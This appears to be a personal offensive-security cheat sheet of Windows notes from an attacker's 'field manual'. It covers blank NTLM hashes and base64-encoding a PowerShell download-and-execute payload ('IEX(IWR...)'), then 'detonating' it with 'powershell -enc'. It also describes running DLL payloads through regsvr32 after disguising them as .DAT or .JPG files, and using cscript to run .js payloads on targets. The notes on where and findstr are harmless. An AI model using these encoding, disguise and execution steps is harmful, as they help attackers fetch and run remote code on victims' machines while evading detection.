# win_facts

sort these as the field manual develops

## hashing on windows

> NTLM hashes
```
LM:NTLM						; lan man : new technology lan manager
aad3...:31d6...				; blank hashes
```
> explanation of above
```
LM is no longer used but is often required for interacting with services; Anything can be put here! So long as its a valid hash
```


## default windows encoding

> default encoding
```
UTF-16le 			; UTF-8 little endian

NECESSARY FOR POWERSHELL ENCODED COMMANDS
```


> encoding the payload
```sh
echo -n 'IEX(IWR....)' | iconv -t UTF-16LE | base64 -w 0

explanation:
	echo is the ps command we doing, new object, invoke-web, w.e.
	-t ; to code
	-w 0 ; all on 1 line
```


> detonating the payload
```sh
powershell -enc 'BASE64_ENCODED_COMMAND'
```


## microsoft binaries

### where

This binary acts almost identically to linux's `which`. The following gives the absolte path of `whoami.exe`.

```cmd
where whoami
```


### findstr

Similar to `grep`, usage of the `findstr` binary is a fundamental skill. The following searches `STDOUT` for strings that **do not contain** `"windows"`, ignoreing case sensitivity.

```cmd
| findstr /v /i "C:\Windows"
```


### regsrv32

This `regsrv32` binary will execute `.DLL` files. It does not care about the extension, it reads the binary header instead. First mask the payload as a `.DAT` or `.JPG` before execution. 


### cscript

The `cscript` binary is the parser for scripts. Similar to `wscript`, but without abilities to make windows. Notably, `cscript` will parse javascript. This enables `.js` payloads to be used on targets. 

